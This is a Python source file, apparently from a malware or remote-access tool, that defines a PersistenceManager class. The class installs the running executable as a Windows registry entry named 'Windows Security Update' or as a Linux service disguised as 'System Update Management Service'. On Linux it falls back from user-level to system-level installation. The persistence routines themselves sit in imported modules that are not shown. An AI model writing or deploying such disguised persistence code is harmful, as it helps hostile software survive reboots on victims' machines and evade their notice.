import platform
import sys



class PersistenceManager:
    def __init__(self):
        self.platform = platform.system()
        self.installed = False
        self.persistence = self._init_persistence()



    def _init_persistence(self):
        if self.platform == "Windows":
            try:
                from windows_pers import WindowsPersistence
                
                return WindowsPersistence(
                    key_name="Windows Security Update",
                    file_path=sys.executable
                )
            except ImportError:
                return self._create_dummy_persistence()
        
        elif self.platform == "Linux":
            try:
                from linux_pers import LinuxPersistence

                return LinuxPersistence(
                    service_name="system-update-manager",
                    exec_path=sys.executable,
                    description="System Update Management Service"
                )
            
            except ImportError:
                return self._create_dummy_persistence()

        else:
            return self._create_dummy_persistence()
    

    def _create_dummy_persistence(self):
        class DummyPersistence:
            def install_persistence(self): return False
            def check_persistence(self): return False
            def remove_persistence(self): return False
        
        return DummyPersistence()
        
        
    def install_persistence(self):
        if self.platform == "Linux":
            success = self.persistence.install_persistence(user_level=True)
            
            if not success:
                success = self.persistence.install_persistence(user_level=False)
        
        else:
            success = self.persistence.install_persistence()
        

        self.installed = success
        return success
        
    def check_persistence(self):
        return self.persistence.check_persistence()